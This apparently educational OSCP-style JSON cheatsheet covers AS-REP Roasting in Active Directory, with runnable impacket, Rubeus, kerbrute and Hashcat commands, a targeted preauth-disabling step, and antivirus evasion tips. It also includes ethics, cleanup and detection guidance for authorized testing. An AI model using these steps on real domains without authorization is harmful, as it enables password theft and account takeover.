{
  "cheatsheets": [
    {
      "id": "ad-asreproast-methodology",
      "name": "Active Directory AS-REP Roasting Methodology",
      "description": "Complete methodology for AS-REP Roasting attacks against Active Directory - exploiting users with 'Do not require Kerberos preauthentication' enabled to extract offline-crackable hashes",
      "educational_header": {
        "how_to_recognize": [
          "You have valid domain user credentials OR network access to domain controller",
          "You're looking for credential access attacks that don't require privileged access",
          "You want to extract offline-crackable password hashes from AD",
          "You've identified users with 'Do not require Kerberos preauthentication' enabled"
        ],
        "when_to_look_for": [
          "During initial domain enumeration after obtaining valid credentials",
          "When password spraying doesn't find weak passwords (AS-REP may reveal different accounts)",
          "After gaining access to domain-joined Windows system (Rubeus doesn't need explicit credentials)",
          "OSCP exam: Quick win attack - takes <5 seconds to identify vulnerable users, 1-60 minutes to crack"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: External AS-REP Roasting from Linux (With Credentials)",
          "context": "You're on a Kali Linux attack box with network access to domain controller at 192.168.50.70 (domain: corp.com). You've obtained valid domain credentials (pete:Nexus123!) via password spraying. You want to check if any users have Kerberos preauthentication disabled and extract their password hashes for offline cracking.",
          "approach": "Use impacket-GetNPUsers to enumerate and extract AS-REP hashes. This is the standard Linux-based AS-REP roasting method. First identify vulnerable users, then request AS-REP hashes in Hashcat-compatible format. Crack hashes with Hashcat mode 18200.",
          "commands": [
            "impacket-getnpusers-identify",
            "impacket-getnpusers-asreproast",
            "hashcat-crack-asrep",
            "crackmapexec-validate-admin"
          ],
          "expected_outcome": "impacket-GetNPUsers without -request flag lists vulnerable users: dave (standard user, no admin groups). With -request flag, extracts AS-REP hash: $krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1... saved to hashes.asreproast. Hashcat mode 18200 with rockyou.txt and best64.rule cracks hash in 15 minutes: dave:Flowers1. Validate with crackmapexec to check admin rights. TIME ESTIMATE: Enumeration (5 sec) + hash extraction (5 sec) + cracking (1-60 min depending on password).",
          "why_this_works": "KERBEROS PREAUTHENTICATION normally prevents offline attacks by requiring encrypted timestamp from client BEFORE issuing AS-REP. If preauthentication is DISABLED (DONT_REQ_PREAUTH UAC flag), the KDC will issue AS-REP to anyone who requests it for that user - no password needed. The AS-REP contains encrypted data (enc-part) using the user's password hash as the encryption key. We can request this AS-REP and brute-force the encryption key offline. DEFAULT SETTING: Preauthentication is ENABLED by default (secure). Accounts with preauthentication disabled are RARE - usually required for: (1) Legacy applications (old Kerberos implementations). (2) Service accounts with specific compatibility requirements. (3) Misconfigurations. ATTACK REQUIREMENTS: Valid domain credentials (any user) for authenticated LDAP query OR username wordlist for unauthenticated enumeration (-usersfile flag, less common). HASH FORMAT: $krb5asrep$23$ = Kerberos 5 AS-REP etype 23 (RC4-HMAC). Hashcat mode 18200. TIME SYNC: Kerberos requires <5 minute clock difference. Use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur."
        },
        {
          "title": "Scenario 2: Internal AS-REP Roasting from Windows (Domain-Joined System)",
          "context": "You've gained RDP access to a Windows 10 workstation CLIENT75 as domain user corp\\jeff (password: HenchmanPutridBonbon11). The system is domain-joined to corp.com. You want to perform AS-REP roasting without needing to enter credentials manually (use existing session). Rubeus.exe is available in C:\\Tools\\.",
          "approach": "Use Rubeus asreproast from the domain-joined Windows system. Rubeus will automatically use your current domain user context (no credentials needed), enumerate all users with preauthentication disabled, and extract AS-REP hashes in Hashcat-compatible format. Transfer hashes to Kali for cracking.",
          "commands": [
            "rubeus-asreproast",
            "hashcat-crack-asrep"
          ],
          "expected_outcome": "Rubeus.exe asreproast /nowrap identifies dave with preauthentication disabled. Output shows: SamAccountName: dave, DistinguishedName: CN=dave,CN=Users,DC=corp,DC=com, ServicePrincipalName: (none), PwdLastSet: 9/7/2022 5:21:17 AM. AS-REP hash displayed (single line due to /nowrap): $krb5asrep$dave@corp.com:AE43CA9011CC7E7B.... Copy hash to Kali, save as hashes.asreproast2, crack with Hashcat mode 18200: dave:Flowers1. TIME ESTIMATE: Hash extraction (5-10 sec) + transfer to Kali (30 sec) + cracking (1-60 min).",
          "why_this_works": "RUBEUS ADVANTAGES: (1) No credentials needed - uses current user's Kerberos session. (2) Faster than impacket (native Windows Kerberos API). (3) No time sync issues. (4) Auto-discovers domain context. /nowrap FLAG CRITICAL: Without /nowrap, hash output spans multiple lines with line breaks. Hashcat requires SINGLE-LINE format. /nowrap prevents newlines in hash string. TOOL LOCATION: Rubeus.exe typically in C:\\Tools\\ on OSCP lab systems. Download: https://github.com/GhostPack/Rubeus. EXECUTION CONTEXT: Must run from domain-joined system OR use runas /netonly /user:DOMAIN\\username cmd.exe to inject credentials. AV EVASION: Rubeus is flagged by Windows Defender. Options: (1) Disable AV (Add-MpPreference -ExclusionPath C:\\Tools). (2) Obfuscated Rubeus build. (3) Reflectively load in memory (Invoke-Rubeus). (4) Fall back to impacket-GetNPUsers from Linux. HASH OUTPUT FORMAT: Default is Hashcat mode 18200 compatible. Can specify /format:john for John the Ripper format."
        },
        {
          "title": "Scenario 3: Identifying Vulnerable Users Without Extracting Hashes",
          "context": "You're performing reconnaissance and want to identify which users are vulnerable to AS-REP roasting WITHOUT extracting hashes yet. You have domain credentials (pete:Nexus123!) and want to understand the attack surface before committing to hash extraction. You want to identify high-value targets (admin accounts, old passwords) for prioritized attacks.",
          "approach": "Use impacket-GetNPUsers or PowerView to enumerate users with preauthentication disabled. Analyze output for: (1) Group membership (Domain Admins, Enterprise Admins). (2) Password age (PasswordLastSet). (3) Last logon (active vs stale accounts). Prioritize high-value targets before extracting hashes.",
          "commands": [
            "impacket-getnpusers-identify",
            "powerview-asreproast-identify"
          ],
          "expected_outcome": "IMPACKET OUTPUT: Name: dave, MemberOf: CN=Users,DC=corp,DC=com (standard user, no privileged groups), PasswordLastSet: 2022-09-02 19:21:17 (password 5 days old), LastLogon: 2022-09-07 12:45:15 (active account). UAC: 0x410200 (DONT_REQ_PREAUTH flag set). POWERVIEW OUTPUT: samaccountname: dave, memberof: CN=Users,DC=corp,DC=com, pwdlastset: 133069404... (convert to date). ANALYSIS: (1) No privileged groups = standard user (still valuable for lateral movement). (2) Recent password change = might be strong (but worth trying). (3) Active account = credentials will be useful. DECISION: Extract hash and attempt crack - even standard user provides domain enumeration and potential lateral movement. TIME ESTIMATE: <5 seconds for enumeration.",
          "why_this_works": "ENUMERATION-ONLY approach allows: (1) Reconnaissance without committing to attack. (2) Target prioritization (attack admin accounts first). (3) Understanding attack surface (10 vulnerable users vs 1). (4) Avoiding detection (enumeration is quieter than hash extraction). UAC FLAG: 0x410200 = 4194816 decimal = DONT_REQ_PREAUTH (0x400000) + other flags. Check with: (Get-DomainUser dave -Properties useraccountcontrol).useraccountcontrol -band 4194304 (returns 4194304 if flag set). PASSWORD AGE ANALYSIS: Old PasswordLastSet dates (>1 year) indicate weak password likely. Users rarely change passwords - password from 2019 might still be 'Summer2019!' or 'Password1!'. GROUP MEMBERSHIP: Look for 'Domain Admins', 'Enterprise Admins', 'Backup Operators', 'Account Operators' (privileged groups). Standard users can still pivot to admin via cached credentials on workstations. STALE ACCOUNTS: LastLogon very old (>6 months) = account might be disabled or unused. Focus on active accounts first."
        },
        {
          "title": "Scenario 4: Targeted AS-REP Roasting with GenericWrite Permissions",
          "context": "You're performing an AD assessment and have identified that user corp\\jeff has GenericWrite permissions on user corp\\targetuser. No users currently have preauthentication disabled. You want to perform TARGETED AS-REP roasting: temporarily enable DONT_REQ_PREAUTH on targetuser, extract hash, crack password, then reset UAC to original value.",
          "approach": "Use PowerView Set-DomainObject to modify targetuser's userAccountControl attribute, adding the DONT_REQ_PREAUTH flag (4194304). Extract AS-REP hash with Rubeus or impacket. Crack hash offline. CRITICAL: Reset UAC after obtaining hash to avoid leaving account vulnerable. Document all changes for assessment report.",
          "commands": [
            "targeted-asreproast-set",
            "rubeus-asreproast",
            "impacket-getnpusers-asreproast",
            "hashcat-crack-asrep",
            "targeted-asreproast-cleanup"
          ],
          "expected_outcome": "PERMISSION VERIFICATION: Get-DomainObjectAcl -Identity targetuser -ResolveGUIDs shows jeff has GenericWrite. ENABLE PREAUTH BYPASS: Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} succeeds. Verification: (Get-DomainUser targetuser -Properties useraccountcontrol).useraccountcontrol shows 4194816 (DONT_REQ_PREAUTH enabled). EXTRACT HASH: Rubeus asreproast finds targetuser, extracts hash. CRACK: Hashcat mode 18200 cracks hash: targetuser:CompanyPassword123!. CLEANUP: Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} resets UAC. Verification shows UAC back to 512 (normal). TIME ESTIMATE: Set flag (5 sec) + extract hash (10 sec) + crack (1-60 min) + cleanup (5 sec).",
          "why_this_works": "TARGETED ATTACK for scenarios where NO users have preauthentication disabled by default. PERMISSION REQUIREMENTS: GenericWrite OR GenericAll on target user account. These permissions allow modifying user attributes including userAccountControl. UAC XOR OPERATION: Using -XOR with 4194304 (0x400000 = DONT_REQ_PREAUTH bit) TOGGLES the flag without affecting other UAC bits. First XOR enables flag, second XOR disables it (reversible). Safer than -Set which overwrites entire UAC value. COMMON PERMISSION SCENARIOS: (1) Service account management (IT has write permissions on service accounts). (2) Delegated administration (help desk can modify specific user OUs). (3) ACL misconfigurations (GenericAll on Users OU). (4) Group-based permissions (member of 'Account Operators' group). ETHICAL CONSIDERATIONS: This MODIFIES production AD. Impact: (1) Temporarily weakens account security. (2) Creates audit trail (Event ID 4738 - user account changed). (3) Can alert security monitoring. ALWAYS: (1) Get written authorization. (2) Document changes. (3) Reset UAC immediately after hash extraction. (4) Include in assessment report with before/after UAC values. DETECTION: Event ID 4738 shows userAccountControl modification. DONT_REQ_PREAUTH on standard user account is HIGHLY SUSPICIOUS. Blue team should alert on UAC changes to 4194816."
        },
        {
          "title": "Scenario 5: Time Synchronization Troubleshooting (KRB_AP_ERR_SKEW)",
          "context": "You're attempting AS-REP roasting from Kali Linux against corp.com domain controller (192.168.50.70). You receive error: 'Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)'. Your attack is blocked due to time synchronization issues. You need to sync your Kali system time with the domain controller to successfully perform AS-REP roasting.",
          "approach": "Synchronize Kali system time with domain controller using ntpdate or rdate. Kerberos requires <5 minute time difference between client and KDC. After sync, retry AS-REP roasting with impacket-GetNPUsers. Verify time sync before long-running attacks to avoid mid-attack failures.",
          "commands": [],
          "expected_outcome": "BEFORE SYNC: date shows Kali time: 14:30:00 UTC. DC time (estimated via NTP): 14:42:00 UTC (12 minute difference). Error: KRB_AP_ERR_SKEW. SYNC WITH NTPDATE: sudo ntpdate 192.168.50.70 shows: 7 Sep 14:42:03 ntpdate[12345]: adjust time server 192.168.50.70 offset 0.720003 sec. Kali time now matches DC. VERIFICATION: date shows 14:42:05 UTC (within 5 seconds of DC). RETRY ATTACK: impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete now succeeds. Hash extracted successfully. TIME ESTIMATE: 5-10 seconds for time sync + retry attack.",
          "why_this_works": "KERBEROS TIME REQUIREMENT: Kerberos authentication requires client and KDC (domain controller) clocks to be within 5 minutes by default (configurable via MaxClockSkew policy). WHY: Prevents replay attacks - Kerberos tickets have timestamps. If clocks are misaligned, timestamp validation fails. ERROR KRB_AP_ERR_SKEW: Kerberos error code indicating time difference exceeds MaxClockSkew policy. Common in VM environments (clock drift), cross-timezone attacks, or systems without NTP configured. NTPDATE vs RDATE: (1) ntpdate: Uses NTP protocol (port 123/UDP). More accurate, gradual adjustment. Syntax: sudo ntpdate <DC_IP>. May require: sudo apt install ntpdate. (2) rdate: Uses Time protocol (port 37/TCP). Simple, immediate set. Syntax: sudo rdate -n <DC_IP>. Legacy protocol, may be blocked by firewall. OSCP TIP: Try ntpdate first. If port 123 blocked, try rdate. If both fail, manually set time: sudo date -s 'YYYY-MM-DD HH:MM:SS'. AUTOMATION: Add time sync to attack script: sudo ntpdate $DC_IP 2>/dev/null || sudo rdate -n $DC_IP 2>/dev/null || echo 'Manual time sync required'. VERIFICATION: Compare Kali time (date) with DC time. Windows DC: net time \\\\DC_IP shows DC time. PERSISTENT SYNC: For long engagements, configure NTP: echo 'server <DC_IP> iburst' | sudo tee -a /etc/ntp.conf; sudo systemctl restart ntp."
        }
      ],
      "sections": [
        {
          "title": "Understanding AS-REP Roasting vs Password Spraying",
          "notes": "AS-REP ROASTING and PASSWORD SPRAYING are complementary attacks with different requirements and targets. PASSWORD SPRAYING: Tests ONE password against MANY users. Requires: Domain access OR Kerberos port 88. Targets: All users (looking for weak passwords). Risk: Account lockout if threshold exceeded. Success rate: 10-30% (common weak passwords). AS-REP ROASTING: Extracts hashes from users with SPECIFIC misconfiguration. Requires: Valid credentials OR username list. Targets: Only users with DONT_REQ_PREAUTH enabled (rare - often <5% of users). Risk: None - no lockout mechanism. Success rate: High IF vulnerable users exist (hash cracking depends on password strength). RECOMMENDATION: Run BOTH attacks. Password spraying finds weak passwords across all users. AS-REP roasting finds ANY password (weak or strong) on misconfigured accounts. Different attack surfaces - one may succeed where other fails. TIME ESTIMATE: Password spray (5-10 min including policy check and spraying). AS-REP roast (30 sec enumeration + 1-60 min cracking). DETECTION: Password spraying generates Event ID 4625 (failed logons) - noisy if lockout threshold reached. AS-REP roasting generates Event ID 4768 (TGT request) - normal Kerberos traffic, stealthy.",
          "commands": [
            {
              "id": "impacket-getnpusers-identify",
              "example": "impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete",
              "shows": "Name"
            },
            {
              "id": "kerbrute-passwordspray",
              "example": "kerbrute passwordspray -d corp.com --dc 192.168.50.70 valid_users.txt 'Nexus123!'",
              "shows": "[+] VALID LOGIN:"
            }
          ]
        },
        {
          "title": "Default AD Security Posture - Why AS-REP Roasting is Rare",
          "notes": "KERBEROS PREAUTHENTICATION is ENABLED BY DEFAULT in Active Directory. This is the SECURE configuration. User account creation via ADUC (Active Directory Users and Computers) or New-ADUser cmdlet does NOT set DONT_REQ_PREAUTH flag. WHY PREAUTHENTICATION EXISTS: Prevents offline brute-force attacks. Without preauth, anyone could request AS-REP for any user and crack offline. With preauth, client must prove knowledge of password (encrypted timestamp) BEFORE receiving AS-REP. WHEN PREAUTHENTICATION IS DISABLED: (1) LEGACY APPLICATIONS: Old Kerberos implementations (pre-Windows 2000) that don't support preauthentication. Rare in modern environments. (2) THIRD-PARTY SERVICES: Some vendors require preauthentication disabled for compatibility (poorly designed software). (3) SERVICE ACCOUNTS: Misguided attempt to 'simplify' service account configuration. (4) MISCONFIGURATIONS: Accidental checkbox in ADUC or incorrect GPO setting. STATISTICS: In typical corporate domain: 90-99% of users have preauthentication enabled (default). 1-10% might have it disabled (legacy/service accounts). 0% is common in well-configured environments. OSCP EXPECTATION: AS-REP roasting may find 0-2 vulnerable accounts per domain. This is NORMAL - don't assume it will always succeed. Worth checking (takes <30 seconds) but not guaranteed. BLUE TEAM DEFENSE: Monitor Event ID 4738 (user account changes) for userAccountControl modifications to 4194816. Audit users with DONT_REQ_PREAUTH enabled quarterly. Enable preauthentication unless PROVEN incompatibility with specific legacy application.",
          "commands": []
        },
        {
          "title": "Hash Cracking Strategy - Hashcat Mode 18200 Optimization",
          "notes": "AS-REP HASH FORMAT: $krb5asrep$23$user@DOMAIN.COM:hash_data = Kerberos 5 AS-REP etype 23 (RC4-HMAC). HASHCAT MODE: 18200 (Kerberos 5, etype 23, AS-REP). VERIFICATION: hashcat --help | grep -i 'Kerberos' shows mode 18200 for AS-REP. CRACKING STRATEGY: (1) STRAIGHT DICTIONARY: hashcat -m 18200 hashes.asreproast rockyou.txt --force (fast, try first). (2) RULE-BASED: hashcat -m 18200 hashes.asreproast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (adds complexity - Password → Password1, Password!, etc.). (3) TARGETED WORDLIST: If you know username or organization, create custom wordlist: username (dave → dave, Dave, DAVE), organization (corp → corp2023!, Corp123!), common patterns (Password1!, Welcome2023!). PERFORMANCE: RC4-HMAC (etype 23) is FAST to crack on GPU. Hash rate: ~500 MH/s on RTX 3080 (500 million hashes/second). Rockyou.txt (14M passwords) = <1 second straight dictionary. With best64.rule (77 rules) = 1-2 minutes. OSCP VM NOTE: Hashcat in Kali VM without GPU uses CPU - MUCH slower (~500 KH/s vs 500 MH/s). Add --force flag to suppress warnings. Consider cracking on physical machine with GPU for 1000x speed improvement. RULE FILE SELECTION: best64.rule (fast, 77 rules - 1-2 min), rockyou-30000.rule (thorough, 30000 rules - 30-60 min), dive.rule (comprehensive, 100K+ rules - hours). TIME ESTIMATE: Weak password (dictionary word + number) = 1-5 min with rules. Strong password (random 12+ chars) = infeasible. MONITORING: hashcat --status shows progress. Press 's' key for instant status update.",
          "commands": [
            {
              "id": "hashcat-crack-asrep",
              "example": "hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
              "shows": "Cracked"
            }
          ]
        },
        {
          "title": "Cleanup and Remediation After Targeted AS-REP Roasting",
          "notes": "TARGETED AS-REP ROASTING modifies production AD (sets DONT_REQ_PREAUTH flag). CLEANUP IS MANDATORY. IMMEDIATE CLEANUP: After extracting hash and BEFORE starting crack, reset UAC flag: Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose. Same command that enabled flag also disables (XOR is reversible). VERIFICATION: Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol. Normal UAC values: 512 (enabled account), 544 (password not required, disabled preauthentication - legacy), 66048 (disabled account). Values with +4194304 indicate DONT_REQ_PREAUTH still enabled (CLEANUP FAILED). AUTOMATION: Create cleanup script with timer: Start-Sleep -Seconds 1800; Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}. Sets 30-minute reminder for manual cleanup. ASSESSMENT REPORTING: Document in report: (1) User account modified (targetuser). (2) Modification type (DONT_REQ_PREAUTH enabled temporarily). (3) Duration (enabled from 14:30 to 14:35 - 5 minutes). (4) Cleanup verification (UAC reset to 512 confirmed). (5) Before/after screenshots (Get-DomainUser output). FAILED CLEANUP SCENARIO: If you lose access before cleanup (session dropped, RDP disconnected, network issue): (1) Document in report immediately. (2) Notify client ASAP. (3) Provide manual cleanup steps: ADUC → Find user → Properties → Account tab → Uncheck 'Do not require Kerberos preauthentication' → OK. (4) Follow up to confirm client completed cleanup. ETHICS: Leaving account with DONT_REQ_PREAUTH enabled = unprofessional and potentially violates engagement terms. Pentest certifications (OSCP, OSWE) emphasize proper cleanup. CLIENT COMMUNICATION: If cleanup fails, email client: 'During assessment, user [username] had temporary AD modification (DONT_REQ_PREAUTH flag). Please verify flag has been reset using provided steps. Apologize for inconvenience.'",
          "commands": [
            {
              "id": "targeted-asreproast-cleanup",
              "example": "Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304} -Verbose",
              "shows": "useraccountcontrol set"
            }
          ]
        }
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "AS-REP_ROASTING",
        "KERBEROS",
        "METHODOLOGY",
        "OSCP:HIGH",
        "WORKFLOW"
      ]
    }
  ]
}